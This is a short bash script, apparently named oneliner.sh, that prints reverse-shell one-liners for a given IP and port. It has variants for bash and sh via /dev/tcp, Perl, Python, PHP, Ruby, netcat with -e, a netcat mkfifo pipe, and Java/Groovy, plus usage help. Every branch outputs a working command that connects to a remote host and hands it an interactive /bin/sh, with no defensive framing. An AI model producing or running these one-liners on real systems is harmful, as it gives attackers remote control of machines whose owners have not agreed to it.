#!/bin/bash

	case $1 in
	bash) echo -e "bash -i >& /dev/tcp/"$2"/"$3" 0>&1"
		;;
	sh) echo -e "sh -i >& /dev/tcp/"$2"/"$3" 0>&1"
		;;
	perl) echo -e "perl -e \x27use Socket;$i=\x22"$2"\x22;$p="$3";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\x22tcp\x22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\x22>&S\x22);open(STDOUT,\x22>&S\x22);open(STDERR,\x22>&S\x22);exec(\x22/bin/sh -i\x22);};\x27"
		;;
	py) echo -e "python -c \x27import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x22"$2"\x22,"$3"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\x22/bin/sh\x22,\x22-i\x22]);\x27"
		;;
	php) echo -e "php -r \x27$sock=fsockopen(\x22"$2"\x22,"$3");exec(\x22/bin/sh -i <&3 >&3 2>&3\x22);\x27"
		;;
	ruby) echo -e "ruby -rsocket -e\x27f=TCPSocket.open(\x22"$2"\x22,"$3").to_i;exec sprintf(\x22/bin/sh -i <&%d >&%d 2>&%d\x22,f,f,f)\x27"
		;;
	nc) echo -e "nc -e /bin/sh " $2 " "$3
		;;
	nct) echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "$2" "$3 " >/tmp/f"
		;;
	java) printf "r = Runtime.getRuntime()\np = r.exec([\x22/bin/bash\x22,\x22-c\x22,\x22exec 5<>/dev/tcp/"$2"/"$3";cat <&5 | while read line; do \$line 2>&5 >&5; done\x22] as String[])\np.waitFor()\n"
		;;
	help) printf "\nusage:$ oneliner.sh shellname ip port\n"
		printf "ex. $ oneliner.sh bash 192.168.0.1 4444\n"
		printf "\nShellnames\n\n1.bash\t2.sh\n3.perl\t4.py\n5.php\t6.ruby\n7.nc\t8.nct \x28traditional with -e\x29\n9.java\n\n"
		;;
	*) printf "\nusage:$ oneliner.sh shellname ip port\n"
		printf "ex. $ oneliner.sh bash 192.168.0.1 4444\n"
		printf "\nShellnames\n\n1.bash\t2.sh\n3.perl\t4.py\n5.php\t6.ruby\n7.nc\t8.nct \x28traditional with -e\x29\n9.java\n\n"
		;;
	esac







